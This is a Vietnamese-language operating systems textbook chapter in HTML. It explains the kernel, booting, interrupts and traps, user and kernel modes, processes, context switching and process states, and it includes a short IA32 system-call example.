<p>Một số ví dụ về hệ điều hành bao gồm: <strong>Microsoft Windows</strong>, <strong>Apple macOS</strong> và <strong>iOS</strong>, <strong>Oracle Solaris</strong>, và các biến thể <strong>Unix</strong> mã nguồn mở như <strong>OpenBSD</strong> và <strong>Linux</strong>.<br />
Trong cuốn sách này, chúng ta sử dụng các ví dụ trên Linux.<br />
Tuy nhiên, tất cả các hệ điều hành đa dụng khác đều triển khai các chức năng tương tự, dù đôi khi theo những cách khác nhau.</p>
<h3 id="kernel"><a class="header" href="#kernel">Kernel</a></h3>
<p>Thuật ngữ <strong>operating system</strong> thường được dùng để chỉ một tập hợp lớn phần mềm hệ thống thực hiện một số dạng quản lý tài nguyên và triển khai các abstraction “dễ sử dụng” của hệ thống bên dưới.<br />
Trong chương này, chúng ta tập trung vào <strong>kernel</strong> của hệ điều hành; do đó, khi chỉ nói <strong>OS</strong>, ta đang đề cập đến <strong>OS kernel</strong>.</p>
<p><strong>OS kernel</strong> triển khai các chức năng cốt lõi của OS — những chức năng cần thiết cho bất kỳ việc sử dụng hệ thống nào.<br />
Các chức năng này bao gồm:</p>
<ul>
<li>Quản lý tầng phần cứng máy tính để chạy chương trình.</li>
<li>Triển khai và quản lý các abstraction của OS cung cấp cho người dùng hệ thống (ví dụ: <strong>file</strong> là một abstraction của OS trên dữ liệu lưu trữ).</li>
<li>Triển khai các <strong>interface</strong> (giao diện) tới tầng ứng dụng người dùng và tới tầng thiết bị phần cứng.</li>
</ul>
<p>Kernel triển khai các <strong>mechanism</strong> (cơ chế) để cho phép phần cứng chạy chương trình và triển khai các abstraction như process.<br />
<strong>Mechanism</strong> là phần “làm thế nào” của chức năng OS.<br />
Kernel cũng triển khai các <strong>policy</strong> (chính sách) để quản lý hiệu quả phần cứng và điều khiển các abstraction của nó.<br />
<strong>Policy</strong> quyết định phần “cái gì”, “khi nào” và “cho ai” của chức năng OS.<br />
Ví dụ: một mechanism triển khai việc khởi tạo CPU để chạy lệnh từ một process cụ thể, còn policy sẽ quyết định process nào được chạy tiếp theo trên CPU.</p>
<p>Kernel triển khai <strong>system call interface</strong> (giao diện lời gọi hệ thống) cho người dùng hệ thống.<br />
Người dùng và chương trình tương tác với OS thông qua system call interface này.<br />
Ví dụ: nếu một chương trình muốn biết thời gian hiện tại trong ngày, nó có thể lấy thông tin đó từ OS bằng cách gọi system call <code>gettimeofday</code>.</p>
<p>Kernel cũng cung cấp <strong>device interface</strong> (giao diện thiết bị) để tương tác với phần cứng.<br />
Thông thường, các thiết bị I/O như <strong>HDD</strong> (ổ cứng), bàn phím, và <strong>SSD</strong> (ổ thể rắn) tương tác với kernel thông qua giao diện này.<br />
Các thiết bị này đi kèm với <strong>device driver</strong> (trình điều khiển thiết bị) đặc biệt, chạy trong OS và xử lý việc truyền dữ liệu tới hoặc từ thiết bị.<br />
Device driver tương tác với OS thông qua device interface; một thiết bị mới có thể được thêm vào hệ thống bằng cách nạp code device driver của nó (được viết tuân theo device interface của OS) vào OS.<br />
Kernel trực tiếp quản lý các thiết bị phần cứng khác như CPU và RAM.</p>
<p><strong>Hình 2</strong> cho thấy lớp OS kernel nằm giữa ứng dụng người dùng và phần cứng máy tính, bao gồm cả giao diện lập trình cho người dùng và giao diện thiết bị phần cứng.</p>
<p><img src="C13-OS/_images/osinterfaces.png" alt="OS kernel implements an interface to applications and to hardware devices" /></p>
<p><strong>Hình 2.</strong> OS kernel: chức năng cốt lõi của OS cần thiết để sử dụng hệ thống và hỗ trợ sự phối hợp giữa thiết bị I/O và người dùng hệ thống.</p>
<p>Trong phần còn lại của chương này, chúng ta sẽ xem xét vai trò của OS trong việc chạy chương trình và quản lý hiệu quả tài nguyên hệ thống.<br />
Phần thảo luận chủ yếu tập trung vào <strong>mechanism</strong> (cách thức) của chức năng OS và việc triển khai hai abstraction chính của OS:</p>
<ul>
<li><strong>Process</strong>: một chương trình đang chạy.</li>
<li><strong>Virtual memory</strong>: một góc nhìn về không gian bộ nhớ của process, được trừu tượng hóa khỏi bộ nhớ vật lý bên dưới trong RAM hoặc bộ nhớ phụ.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="131-cách-hệ-điều-hành-hoạt-động-và-cách-nó-chạy"><a class="header" href="#131-cách-hệ-điều-hành-hoạt-động-và-cách-nó-chạy">13.1. Cách hệ điều hành hoạt động và cách nó chạy</a></h2>
<p>Một phần công việc của <strong>OS</strong> (Operating System – hệ điều hành) là hỗ trợ các chương trình chạy trên hệ thống.<br />
Để bắt đầu chạy một chương trình trên máy tính, OS sẽ:</p>
<ol>
<li>Cấp phát một phần <strong>RAM</strong> cho chương trình đang chạy.</li>
<li>Nạp <strong>binary executable</strong> (tệp thực thi nhị phân) của chương trình từ đĩa vào RAM.</li>
<li>Tạo và khởi tạo trạng thái của OS cho <strong>process</strong> (tiến trình) tương ứng với chương trình đang chạy.</li>
<li>Khởi tạo CPU để bắt đầu thực thi các lệnh của process (ví dụ: các <strong>CPU register</strong> cần được OS khởi tạo để CPU có thể nạp và thực thi các lệnh của process).</li>
</ol>
<p><strong>Hình 1</strong> minh họa các bước này.</p>
<p><img src="C13-OS/_images/runprog.png" alt="The OS runs programs on hardware" /></p>
<p><strong>Hình 1.</strong> Các bước OS thực hiện để khởi chạy một chương trình mới trên phần cứng bên dưới.</p>
<p>Giống như các chương trình của người dùng, OS cũng là phần mềm chạy trên phần cứng máy tính.<br />
Tuy nhiên, OS là <strong>system software</strong> (phần mềm hệ thống) đặc biệt, quản lý tất cả tài nguyên hệ thống và triển khai giao diện cho người dùng; nó là thành phần bắt buộc để sử dụng máy tính.</p>
<p>Vì OS là phần mềm, code thực thi nhị phân của nó cũng chạy trên phần cứng như bất kỳ chương trình nào khác: dữ liệu và lệnh của nó được lưu trong RAM, và các lệnh được CPU nạp và thực thi giống như lệnh của chương trình người dùng.<br />
Do đó, để OS chạy, code thực thi nhị phân của nó cần được nạp vào RAM và CPU phải được khởi tạo để bắt đầu chạy code của OS.<br />
Tuy nhiên, vì OS chịu trách nhiệm chạy code trên phần cứng, nên nó cần một bước hỗ trợ ban đầu để tự khởi động.</p>
<h3 id="1311-os-booting"><a class="header" href="#1311-os-booting">13.1.1. OS Booting</a></h3>
<p>Quá trình OS tự nạp và khởi tạo trên máy tính được gọi là <strong>booting</strong> — OS “tự kéo mình lên bằng dây giày” (<em>pulls itself up by its bootstraps</em>), hay <em>boot</em> chính nó trên máy tính.<br />
OS cần một chút hỗ trợ ban đầu để được nạp vào máy tính và bắt đầu chạy code khởi động (<strong>boot code</strong>).</p>
<p>Để khởi chạy code OS, một đoạn code được lưu trong <strong>firmware</strong> (bộ nhớ không mất dữ liệu – nonvolatile memory – trong phần cứng) sẽ chạy khi máy tính vừa bật nguồn.<br />
<strong>BIOS</strong> (Basic Input/Output System) và <strong>UEFI</strong> (Unified Extensible Firmware Interface) là hai ví dụ của loại firmware này.</p>
<p>Khi bật nguồn, BIOS hoặc UEFI sẽ chạy và thực hiện đủ các bước khởi tạo phần cứng để nạp <strong>boot block</strong> (khối khởi động) đầu tiên của OS từ đĩa vào RAM, rồi bắt đầu chạy các lệnh trong boot block trên CPU.<br />
Khi OS bắt đầu chạy, nó sẽ nạp phần còn lại của mình từ đĩa, phát hiện và khởi tạo các tài nguyên phần cứng, đồng thời khởi tạo các cấu trúc dữ liệu và abstraction để hệ thống sẵn sàng cho người dùng.</p>
<h3 id="1312-khiến-os-thực-hiện-công-việc-interrupts-và-traps"><a class="header" href="#1312-khiến-os-thực-hiện-công-việc-interrupts-và-traps">13.1.2. Khiến OS thực hiện công việc: Interrupts và Traps</a></h3>
<p>Sau khi OS hoàn tất quá trình boot và khởi tạo hệ thống, nó sẽ <strong>chờ</strong> cho đến khi có việc cần làm.<br />
Hầu hết các hệ điều hành được triển khai dưới dạng <strong>interrupt-driven system</strong> (hệ thống điều khiển bằng ngắt), nghĩa là OS sẽ không chạy cho đến khi có một tác nhân yêu cầu nó làm việc — OS sẽ được “đánh thức” (bị ngắt khỏi trạng thái chờ) để xử lý yêu cầu.</p>
<p>Các thiết bị ở tầng phần cứng có thể cần OS thực hiện một số tác vụ cho chúng.<br />
Ví dụ: <strong>network interface card</strong> (NIC – card giao tiếp mạng) là giao diện phần cứng giữa máy tính và mạng.<br />
Khi NIC nhận dữ liệu qua kết nối mạng, nó sẽ <strong>interrupt</strong> (ngắt) OS để xử lý dữ liệu nhận được (<strong>Hình 2</strong>).<br />
Ví dụ, OS có thể xác định rằng dữ liệu nhận được từ NIC là một phần của trang web mà trình duyệt web đã yêu cầu; sau đó OS sẽ chuyển dữ liệu từ NIC đến process của trình duyệt web đang chờ.</p>
<p>Các yêu cầu đến OS cũng có thể xuất phát từ ứng dụng người dùng khi chúng cần truy cập tài nguyên được bảo vệ.<br />
Ví dụ: khi một ứng dụng muốn ghi dữ liệu vào tệp, nó sẽ thực hiện một <strong>system call</strong> tới OS, yêu cầu OS thực hiện thao tác ghi thay cho nó (xem <a href="C13-OS/impl.html#FigNICinter">Hình 2</a>).<br />
OS sẽ xử lý system call này bằng cách ghi dữ liệu vào tệp được lưu trên đĩa.</p>
<p><img src="C13-OS/_images/intersyscall.png" alt="Interrupts to the OS are from the hardware layer and Traps are from the user/program layer" /></p>
<p><strong>Hình 2.</strong> Trong hệ thống điều khiển bằng ngắt, chương trình ở mức người dùng thực hiện system call, và thiết bị phần cứng phát ra interrupt để khởi tạo hành động của OS.</p>
<p>Các interrupt đến từ tầng phần cứng, như khi NIC nhận dữ liệu từ mạng, thường được gọi là <strong>hardware interrupt</strong> hoặc đơn giản là <strong>interrupt</strong>.<br />
Các interrupt đến từ tầng phần mềm do kết quả của việc thực thi lệnh, như khi một ứng dụng thực hiện system call, thường được gọi là <strong>trap</strong>.<br />
Nói cách khác, một system call sẽ “trap vào OS”, và OS sẽ xử lý yêu cầu thay cho chương trình ở mức người dùng.</p>
<p>Ngoài ra, <strong>exception</strong> từ cả hai tầng cũng có thể ngắt OS.<br />
Ví dụ: ổ cứng có thể ngắt OS nếu thao tác đọc thất bại do lỗi block đĩa, và một chương trình ứng dụng có thể gây ra trap tới OS nếu nó thực hiện phép chia cho 0.</p>
<p>System call được triển khai bằng các <strong>trap instruction</strong> đặc biệt, được định nghĩa như một phần của <strong>ISA</strong> (Instruction Set Architecture – kiến trúc tập lệnh) của CPU.<br />
OS gán cho mỗi system call một số định danh duy nhất.<br />
Khi một ứng dụng muốn gọi system call, nó sẽ đặt số định danh của lời gọi vào một vị trí đã biết (vị trí này phụ thuộc vào ISA) và thực hiện một trap instruction để ngắt OS.</p>
<p>Trap instruction sẽ khiến CPU dừng thực thi lệnh của chương trình ứng dụng và bắt đầu thực thi lệnh của OS để xử lý trap (chạy <strong>trap handler</strong> của OS).<br />
Trap handler sẽ đọc số định danh system call do người dùng cung cấp và thực thi phần triển khai tương ứng.</p>
<p>Ví dụ về system call <code>write</code> trên hệ thống IA32 Linux:</p>
<pre><code class="language-c">/* C code */
ret = write(fd, buff, size);

# IA32 translation
write:

...            # set up state and parameters for OS to perform write
movl $4, %eax  # load 4 (unique ID for write) into register eax
int  $0x80     # trap instruction: interrupt the CPU and transition to the OS
addl $8, %ebx  # an example instruction after the trap instruction
</code></pre>
<p>Lệnh đầu tiên (<code>movl $4, %eax</code>) đưa số định danh system call cho <code>write</code> (4) vào thanh ghi <code>eax</code>.<br />
Lệnh thứ hai (<code>int $0x80</code>) kích hoạt trap.<br />
Khi code trap handler của OS chạy, nó sẽ dùng giá trị trong thanh ghi <code>eax</code> (4) để xác định system call nào đang được gọi và chạy code xử lý tương ứng (trong trường hợp này là code xử lý <code>write</code>).<br />
Sau khi OS xử lý xong, nó sẽ tiếp tục thực thi chương trình tại lệnh ngay sau trap instruction (<code>addl</code> trong ví dụ này).</p>
<p>Không giống như system call (xuất phát từ việc thực thi lệnh của chương trình), <strong>hardware interrupt</strong> được gửi tới CPU qua <strong>interrupt bus</strong>.<br />
Một thiết bị sẽ đặt một tín hiệu (thường là một số chỉ loại interrupt) lên interrupt bus của CPU (<strong>Hình 3</strong>).<br />
Khi CPU phát hiện tín hiệu trên interrupt bus, nó sẽ dừng thực thi lệnh của process hiện tại và bắt đầu chạy code <strong>interrupt handler</strong> của OS.<br />
Sau khi code xử lý interrupt của OS chạy xong, OS sẽ tiếp tục thực thi process tại lệnh ứng dụng đang chạy khi interrupt xảy ra.</p>
<p><img src="C13-OS/_images/diskinter.png" alt="Interrupt bus" /></p>
<p><strong>Hình 3.</strong> Một thiết bị phần cứng (ổ đĩa) gửi tín hiệu tới CPU qua <strong>interrupt bus</strong> để kích hoạt OS thực thi thay cho nó.</p>
<p>Nếu một chương trình người dùng đang chạy trên CPU khi một <strong>interrupt</strong> (hoặc <strong>trap</strong>) xảy ra, CPU sẽ chạy code <strong>interrupt handler</strong> (hoặc <strong>trap handler</strong>) của OS.<br />
Khi OS xử lý xong interrupt, nó sẽ tiếp tục thực thi chương trình người dùng bị gián đoạn tại đúng vị trí trước khi bị ngắt.</p>
<p>Vì OS là phần mềm, và code của nó được nạp vào RAM và chạy trên CPU giống như code chương trình người dùng, nên OS phải bảo vệ code và trạng thái của mình khỏi các process thông thường đang chạy trong hệ thống.<br />
CPU hỗ trợ điều này bằng cách định nghĩa hai <strong>chế độ thực thi</strong>:</p>
<ol>
<li>
<p><strong>User mode</strong>: CPU chỉ thực thi các lệnh ở mức người dùng và chỉ truy cập các vùng bộ nhớ mà OS cho phép.<br />
OS thường ngăn CPU ở user mode truy cập vào code lệnh và dữ liệu của OS.<br />
User mode cũng giới hạn các thành phần phần cứng mà CPU có thể truy cập trực tiếp.</p>
</li>
<li>
<p><strong>Kernel mode</strong>: CPU có thể thực thi bất kỳ lệnh nào và truy cập bất kỳ vùng bộ nhớ nào (bao gồm cả vùng lưu code lệnh và dữ liệu của OS).<br />
Nó cũng có thể truy cập trực tiếp các thành phần phần cứng và thực thi các lệnh đặc biệt.</p>
</li>
</ol>
<p>Khi code OS chạy trên CPU, hệ thống ở <strong>kernel mode</strong>; khi chương trình người dùng chạy trên CPU, hệ thống ở <strong>user mode</strong>.<br />
Nếu CPU đang ở user mode và nhận một interrupt, CPU sẽ chuyển sang kernel mode, nạp <strong>interrupt handler routine</strong> và bắt đầu thực thi code xử lý interrupt của OS.<br />
Trong kernel mode, OS có thể truy cập phần cứng và các vùng bộ nhớ không được phép trong user mode.<br />
Khi OS xử lý xong interrupt, nó sẽ khôi phục trạng thái CPU để tiếp tục thực thi code người dùng tại đúng vị trí bị gián đoạn, rồi trả CPU về user mode (xem <a href="C13-OS/impl.html#FigCPUInterrupts">Hình 4</a>).</p>
<p><img src="C13-OS/_images/handler.png" alt="OS runs interrupt handler code" /></p>
<p><strong>Hình 4.</strong> CPU và interrupt. Mã người dùng đang chạy trên CPU bị ngắt (tại thời điểm X trên trục thời gian), và code xử lý interrupt của OS được thực thi. Sau khi OS xử lý xong interrupt, việc thực thi code người dùng được tiếp tục (tại thời điểm Y trên trục thời gian).</p>
<p>Trong một hệ thống điều khiển bằng interrupt, interrupt có thể xảy ra bất kỳ lúc nào, nghĩa là OS có thể chuyển từ chạy code người dùng sang chạy code xử lý interrupt ở bất kỳ chu kỳ máy nào.<br />
Một cách để hỗ trợ hiệu quả việc <strong>chuyển ngữ cảnh thực thi</strong> từ user mode sang kernel mode là cho phép kernel chạy trong <strong>execution context</strong> của mọi process trong hệ thống.</p>
<p>Khi boot, OS sẽ nạp code của mình vào một vị trí cố định trong RAM, vị trí này được <strong>map</strong> vào phần trên cùng của <strong>address space</strong> của mọi process (xem <strong>Hình 5</strong>), và khởi tạo một thanh ghi CPU với địa chỉ bắt đầu của hàm xử lý interrupt của OS.<br />
Khi có interrupt, CPU sẽ chuyển sang kernel mode và thực thi các lệnh của code xử lý interrupt của OS, vốn có thể truy cập ở các địa chỉ trên cùng trong address space của mọi process.</p>
<p>Vì mọi process đều có OS được map vào cùng một vị trí ở trên cùng của address space, code xử lý interrupt của OS có thể chạy nhanh trong ngữ cảnh của bất kỳ process nào đang chạy trên CPU khi interrupt xảy ra.<br />
Mã OS này chỉ có thể được truy cập ở kernel mode, giúp bảo vệ OS khỏi các truy cập ở user mode; trong quá trình thực thi bình thường, một process chạy ở user mode và không thể đọc hoặc ghi vào các địa chỉ của OS được map vào phần trên cùng của address space của nó.</p>
<p><img src="C13-OS/_images/osmem.png" alt="The OS is mapped into every process address space" /></p>
<p><strong>Hình 5.</strong> Không gian địa chỉ của process: kernel của OS được map vào phần trên cùng của address space của mọi process.</p>
<p>Mặc dù việc map code OS vào address space của mọi process giúp thực thi code kernel nhanh khi có interrupt, nhưng nhiều bộ xử lý hiện đại có các đặc điểm khiến cơ chế này bộc lộ lỗ hổng bảo mật đối với kernel.<br />
Kể từ thông báo vào tháng 1 năm 2018 về lỗ hổng phần cứng <strong>Meltdown</strong>¹, các hệ điều hành đã tách riêng bộ nhớ kernel và bộ nhớ của chương trình người dùng để bảo vệ chống lại lỗ hổng này, nhưng điều đó cũng khiến việc chuyển sang kernel mode để xử lý interrupt kém hiệu quả hơn.</p>
<h3 id="1313-tài-liệu-tham-khảo"><a class="header" href="#1313-tài-liệu-tham-khảo">13.1.3. Tài liệu tham khảo</a></h3>
<ol>
<li>Meltdown and Spectre.<br />
<a href="https://meltdownattack.com/">https://meltdownattack.com/</a></li>
</ol>
<div style="break-before: page; page-break-before: always;"></div><h2 id="132-processes-tiến-trình"><a class="header" href="#132-processes-tiến-trình">13.2. Processes (Tiến trình)</a></h2>
<p>Một trong những <strong>abstraction</strong> (trừu tượng hóa) chính mà <strong>operating system</strong> (OS – hệ điều hành) triển khai là <strong>process</strong> (tiến trình).<br />
Một process đại diện cho một <strong>instance</strong> (phiên bản) của một chương trình đang chạy trong hệ thống, bao gồm:</p>
<ul>
<li><strong>Binary executable code</strong> (code thực thi nhị phân) của chương trình.</li>
<li><strong>Data</strong> (dữ liệu) của chương trình.</li>
<li><strong>Execution context</strong> (ngữ cảnh thực thi).</li>
</ul>
<p><strong>Context</strong> theo dõi quá trình thực thi của chương trình bằng cách lưu giữ các giá trị <strong>register</strong> (thanh ghi), vị trí <strong>stack</strong>, và lệnh mà nó đang thực thi.</p>
<p>Process là một abstraction cần thiết trong các hệ thống <strong>multiprogramming</strong> (đa chương trình), vốn hỗ trợ nhiều process tồn tại đồng thời trong hệ thống.<br />
Abstraction process được OS sử dụng để theo dõi từng instance riêng biệt của các chương trình đang chạy trong hệ thống, và để quản lý việc sử dụng tài nguyên hệ thống của chúng.</p>
<p>OS cung cấp cho mỗi process một abstraction “<strong>lone view</strong>” (cái nhìn riêng biệt) về hệ thống.<br />
Nghĩa là, OS cô lập các process với nhau và tạo cho mỗi process ảo giác rằng nó đang kiểm soát toàn bộ máy tính.<br />
Trên thực tế, OS hỗ trợ nhiều process hoạt động đồng thời và quản lý việc chia sẻ tài nguyên giữa chúng.<br />
OS ẩn khỏi người dùng các chi tiết về việc chia sẻ và truy cập tài nguyên hệ thống, đồng thời bảo vệ các process khỏi tác động của các process khác đang chạy trong hệ thống.</p>
<p>Ví dụ: một người dùng có thể đồng thời chạy hai instance của chương trình Unix shell cùng với một trình duyệt web trên máy tính.<br />
OS sẽ tạo ra ba process tương ứng với ba chương trình đang chạy này:</p>
<ul>
<li>Một process cho mỗi lần thực thi riêng biệt của Unix shell.</li>
<li>Một process cho trình duyệt web.</li>
</ul>
<p>OS xử lý việc chuyển đổi giữa ba process này khi chúng chạy trên CPU, và đảm bảo rằng khi một process chạy trên CPU, chỉ trạng thái thực thi và tài nguyên hệ thống được cấp cho process đó mới có thể được truy cập.</p>
<h3 id="1321-multiprogramming-và-context-switching"><a class="header" href="#1321-multiprogramming-và-context-switching">13.2.1. Multiprogramming và Context Switching</a></h3>
<p><strong>Multiprogramming</strong> cho phép OS sử dụng hiệu quả tài nguyên phần cứng.<br />
Ví dụ: khi một process đang chạy trên CPU cần truy cập dữ liệu hiện đang nằm trên đĩa, thay vì để CPU rảnh rỗi chờ dữ liệu được đọc vào bộ nhớ, OS có thể chuyển CPU cho một process khác chạy trong khi thao tác đọc dữ liệu của process ban đầu được xử lý bởi đĩa.</p>
<p>Bằng cách sử dụng multiprogramming, OS có thể giảm bớt tác động của <strong>memory hierarchy</strong> (hệ thống phân cấp bộ nhớ) lên workload của chương trình, bằng cách giữ cho CPU luôn bận rộn thực thi một số process trong khi các process khác đang chờ truy cập dữ liệu ở các tầng thấp hơn của bộ nhớ.</p>
<p>Các hệ điều hành đa dụng thường triển khai <strong>timesharing</strong> (chia sẻ thời gian), là một dạng multiprogramming trong đó OS lập lịch để mỗi process lần lượt thực thi trên CPU trong một khoảng thời gian ngắn (gọi là <strong>time slice</strong> hoặc <strong>quantum</strong>).<br />
Khi một process hoàn thành time slice của mình trên CPU, OS sẽ loại process đó ra khỏi CPU và cho process khác chạy.<br />
Hầu hết các hệ thống định nghĩa time slice dài vài <strong>millisecond</strong> (10^-3 giây), đây là một khoảng thời gian dài đối với chu kỳ CPU nhưng con người không nhận thấy được.</p>
<p>Hệ thống timesharing càng củng cố “lone view” của máy tính đối với người dùng; vì mỗi process thường xuyên được thực thi trên CPU trong những khoảng thời gian ngắn, nên việc chúng chia sẻ CPU thường không thể nhận ra đối với người dùng.<br />
Chỉ khi hệ thống bị tải rất nặng, người dùng mới có thể nhận thấy tác động của các process khác trong hệ thống.</p>
<p>Lệnh Unix <code>ps -A</code> liệt kê tất cả các process đang chạy trong hệ thống — bạn có thể sẽ ngạc nhiên về số lượng process này.<br />
Lệnh <code>top</code> cũng hữu ích để xem trạng thái hệ thống khi nó đang chạy, bằng cách hiển thị tập hợp các process hiện đang sử dụng nhiều tài nguyên hệ thống nhất (như thời gian CPU và dung lượng bộ nhớ).</p>
<p>Trong các hệ thống multiprogramming và timesharing, các process chạy <strong>concurrently</strong> (đồng thời), nghĩa là quá trình thực thi của chúng <strong>chồng lấn về thời gian</strong>.<br />
Ví dụ: OS có thể bắt đầu chạy process A trên CPU, sau đó chuyển sang chạy process B một lúc, rồi quay lại chạy tiếp process A.<br />
Trong kịch bản này, process A và B chạy đồng thời vì việc thực thi của chúng trên CPU chồng lấn nhau do OS chuyển đổi qua lại giữa hai process.</p>
<h4 id="context-switching"><a class="header" href="#context-switching">Context Switching</a></h4>
<p><strong>Mechanism</strong> (cơ chế) đằng sau multiprogramming xác định cách OS hoán đổi một process đang chạy trên CPU với process khác.<br />
<strong>Policy</strong> (chính sách) của multiprogramming điều khiển việc lập lịch CPU, tức là chọn process nào từ tập các process ứng viên sẽ được dùng CPU tiếp theo và trong bao lâu.<br />
Ở đây, chúng ta tập trung chủ yếu vào <strong>mechanism</strong> của việc triển khai multiprogramming.<br />
Các giáo trình hệ điều hành sẽ trình bày chi tiết hơn về các <strong>scheduling policy</strong> (chính sách lập lịch).</p>
<p>OS thực hiện <strong>context switching</strong> (chuyển ngữ cảnh), hay hoán đổi trạng thái process trên CPU, như là cơ chế chính đằng sau multiprogramming (và timesharing).<br />
Có hai bước chính để thực hiện một CPU context switch:</p>
<ol>
<li>
<p><strong>OS lưu context</strong> của process hiện đang chạy trên CPU, bao gồm tất cả giá trị register (PC, stack pointer, general-purpose register, condition code, v.v.), trạng thái bộ nhớ, và một số trạng thái khác (ví dụ: trạng thái của các tài nguyên hệ thống mà nó đang sử dụng, như file đang mở).</p>
</li>
<li>
<p><strong>OS khôi phục context</strong> đã lưu của một process khác lên CPU và bắt đầu cho CPU chạy process này, tiếp tục thực thi từ lệnh mà nó đã dừng trước đó.</p>
</li>
</ol>
<p>Một phần của <strong>context switching</strong> (chuyển ngữ cảnh) có thể khiến bạn nghĩ là “bất khả thi” đó là: code của OS thực hiện context switching phải chạy trên CPU <strong>trong khi</strong> nó lưu (hoặc khôi phục) <strong>execution context</strong> (ngữ cảnh thực thi) của một process từ (hoặc lên) CPU.<br />
Các lệnh của code context switching cần sử dụng <strong>CPU hardware register</strong> (thanh ghi phần cứng của CPU) để thực thi, nhưng giá trị các thanh ghi của process đang bị chuyển ra khỏi CPU lại cần được chính code context switching lưu lại.<br />
Phần cứng máy tính cung cấp một số hỗ trợ để điều này khả thi.</p>
<p>Khi khởi động (<strong>boot time</strong>), OS khởi tạo phần cứng, bao gồm cả việc khởi tạo trạng thái CPU, để khi CPU chuyển sang <strong>kernel mode</strong> do một <strong>interrupt</strong>, code <strong>interrupt handler</strong> của OS sẽ bắt đầu thực thi và trạng thái thực thi của process bị ngắt được bảo vệ khỏi việc bị ghi đè.</p>
<p>Phần cứng máy tính và OS phối hợp thực hiện một phần việc lưu ban đầu <strong>user-level execution context</strong> (ngữ cảnh thực thi ở mức người dùng), đủ để code OS có thể chạy trên CPU mà không làm mất trạng thái thực thi của process bị ngắt.</p>
<p>Ví dụ: các giá trị thanh ghi của process bị ngắt cần được lưu lại để khi process chạy lại trên CPU, nó có thể tiếp tục từ đúng vị trí trước đó, sử dụng các giá trị thanh ghi của mình.<br />
Tùy thuộc vào hỗ trợ phần cứng, việc lưu giá trị thanh ghi của process ở mức người dùng có thể được thực hiện hoàn toàn bởi phần cứng, hoặc gần như hoàn toàn bằng phần mềm như là phần đầu tiên của code xử lý ngắt trong kernel.<br />
Tối thiểu, giá trị <strong>program counter (PC)</strong> của process cần được lưu lại để không bị mất khi địa chỉ của kernel interrupt handler được nạp vào PC.</p>
<p>Khi OS bắt đầu chạy, nó thực thi toàn bộ code context switching của process, lưu toàn bộ trạng thái thực thi của process đang chạy trên CPU và khôi phục trạng thái thực thi đã lưu của một process khác lên CPU.<br />
Vì OS chạy ở kernel mode, nó có thể truy cập bất kỳ phần nào của bộ nhớ máy tính, thực thi các lệnh đặc quyền và truy cập bất kỳ thanh ghi phần cứng nào.</p>
<p>Do đó, code context switching của OS có thể truy cập và lưu trạng thái thực thi CPU của bất kỳ process nào vào bộ nhớ, và có thể khôi phục từ bộ nhớ trạng thái thực thi của bất kỳ process nào lên CPU.<br />
Mã context switching của OS kết thúc bằng việc thiết lập CPU để thực thi trạng thái thực thi đã khôi phục của process và chuyển CPU sang user mode.<br />
Khi đã chuyển sang user mode, CPU sẽ thực thi các lệnh và sử dụng trạng thái thực thi từ process mà OS vừa chuyển lên CPU.</p>
<h3 id="1322-process-state-trạng-thái-tiến-trình"><a class="header" href="#1322-process-state-trạng-thái-tiến-trình">13.2.2. Process State (Trạng thái tiến trình)</a></h3>
<p>Trong các hệ thống <strong>multiprogrammed</strong> (đa chương trình), OS phải theo dõi và quản lý nhiều process tồn tại trong hệ thống tại bất kỳ thời điểm nào.<br />
OS duy trì thông tin về mỗi process, bao gồm:</p>
<ul>
<li>
<p><strong>Process id (PID)</strong>: định danh duy nhất cho một process.<br />
Lệnh <code>ps</code> liệt kê thông tin về các process trong hệ thống, bao gồm cả PID của chúng.</p>
</li>
<li>
<p>Thông tin <strong>address space</strong> (không gian địa chỉ) của process.</p>
</li>
<li>
<p><strong>Execution state</strong> (trạng thái thực thi) của process (ví dụ: giá trị CPU register, vị trí stack).</p>
</li>
<li>
<p>Tập hợp tài nguyên được cấp phát cho process (ví dụ: các file đang mở).</p>
</li>
<li>
<p><strong>Process state</strong> (trạng thái tiến trình) hiện tại, là giá trị xác định khả năng được thực thi trên CPU của process.</p>
</li>
</ul>
<p>Trong suốt vòng đời của mình, một process sẽ di chuyển qua nhiều trạng thái khác nhau, tương ứng với các mức độ khác nhau về khả năng được thực thi.<br />
Một cách OS sử dụng process state là để xác định tập hợp các process ứng viên cho việc lập lịch trên CPU.</p>
<p>Các trạng thái thực thi của process gồm:</p>
<ul>
<li>
<p><strong>Ready</strong>: Process có thể chạy trên CPU nhưng hiện chưa được lập lịch (là ứng viên để được context switch lên CPU).<br />
Khi một process mới được OS tạo và khởi tạo, nó sẽ vào trạng thái <em>ready</em> (sẵn sàng để CPU bắt đầu thực thi lệnh đầu tiên).<br />
Trong hệ thống timesharing, nếu một process bị context switch ra khỏi CPU vì hết time slice, nó cũng được đưa vào trạng thái <em>ready</em> (sẵn sàng để CPU thực thi lệnh tiếp theo, nhưng phải chờ đến lượt được lập lịch lại).</p>
</li>
<li>
<p><strong>Running</strong>: Process đang được lập lịch trên CPU và đang thực thi lệnh.</p>
</li>
<li>
<p><strong>Blocked</strong>: Process đang chờ một sự kiện nào đó trước khi có thể tiếp tục thực thi.<br />
Ví dụ: process đang chờ dữ liệu được đọc từ đĩa.<br />
Các process ở trạng thái <em>blocked</em> không phải là ứng viên để lập lịch trên CPU.<br />
Khi sự kiện mà process đang chờ xảy ra, process sẽ chuyển sang trạng thái <em>ready</em> (sẵn sàng chạy lại).</p>
</li>
<li>
<p><strong>Exited</strong>: Process đã thoát nhưng vẫn cần được loại bỏ hoàn toàn khỏi hệ thống.<br />
Một process thoát khi hoàn thành việc thực thi chương trình, hoặc thoát do lỗi (ví dụ: chia cho 0), hoặc nhận yêu cầu kết thúc từ process khác.<br />
Process đã thoát sẽ không bao giờ chạy lại, nhưng vẫn tồn tại trong hệ thống cho đến khi hoàn tất việc dọn dẹp liên quan đến trạng thái thực thi của nó.</p>
</li>
</ul>
<p><strong>Hình 1</strong> minh họa vòng đời của một process trong hệ thống, cho thấy cách nó di chuyển giữa các trạng thái khác nhau.<br />
Lưu ý các mũi tên biểu thị sự chuyển đổi từ trạng thái này sang trạng thái khác.<br />
Ví dụ: một process có thể vào trạng thái <em>Ready</em> theo ba cách:</p>
<ol>
<li>Được OS tạo mới.</li>
<li>Đang <em>blocked</em> chờ sự kiện và sự kiện xảy ra.</li>
<li>Đang chạy trên CPU nhưng hết time slice, OS context switch nó ra để nhường CPU cho một process <em>Ready</em> khác.</li>
</ol>
<p><img src="C13-OS/_images/procstate.png" alt="Process State" /></p>
